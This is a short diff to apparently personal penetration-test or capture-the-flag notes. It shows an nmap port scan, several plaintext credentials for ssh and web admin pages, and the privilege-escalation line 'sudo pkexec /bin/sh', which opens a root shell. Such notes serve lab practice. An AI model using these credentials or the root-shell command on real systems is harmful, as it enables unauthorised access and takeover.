@@ -5,8 +5,9 @@
 # 26/1/2023
 
 ----------------------------------------------------
-# nmap result
+# nmap / exploitation
 ----------------------------------------------------
+```
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
@@ -25,3 +26,4 @@ ssh: yxcvbnmYYY
 gym/admin: asdfghjklXXX
 /store: admin@admin.com admin
 sudo pkexec /bin/sh
+```
